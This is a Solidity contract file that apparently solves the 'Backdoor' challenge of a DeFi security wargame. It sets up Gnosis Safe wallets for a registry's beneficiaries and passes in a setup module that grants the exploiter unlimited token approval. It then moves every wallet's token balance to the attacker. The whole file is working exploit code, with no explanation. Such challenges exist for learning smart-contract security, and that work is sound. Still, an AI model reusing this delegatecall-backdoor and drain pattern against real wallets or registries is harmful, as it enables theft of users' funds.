// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {GnosisSafeProxyFactory} from "safe-smart-account/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "safe-smart-account/proxies/GnosisSafeProxy.sol";
import {GnosisSafe} from "safe-smart-account/GnosisSafe.sol";
import {WalletRegistry} from "./WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Backdoor {
    function approve(address attacker, IERC20 token) external {
        token.approve(attacker, type(uint256).max);
    }
}

contract BackdoorExploiter {
    WalletRegistry registry;
    GnosisSafeProxyFactory factory;
    GnosisSafe masterCopy;
    IERC20 token;
    Backdoor backdoor;

    constructor(address _registry) {
        backdoor = new Backdoor();
        registry = WalletRegistry(_registry);
        masterCopy = GnosisSafe(payable(registry.masterCopy()));
        factory = GnosisSafeProxyFactory(registry.walletFactory());
        token = IERC20(registry.token());
    }

    function attack(address attacker, address[] memory users) external {
        address[] memory owners = new address[](1);
        for (uint256 i = 0; i < users.length; i++) {
            owners[0] = users[i];
            bytes memory initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners,
                    1,
                    address(backdoor),
                    abi.encodeCall(backdoor.approve, (address(this), token)),
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );
            GnosisSafeProxy wallet = factory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                0,
                registry
            );
            token.transferFrom(
                address(wallet),
                attacker,
                token.balanceOf(address(wallet))
            );
        }
    }
}
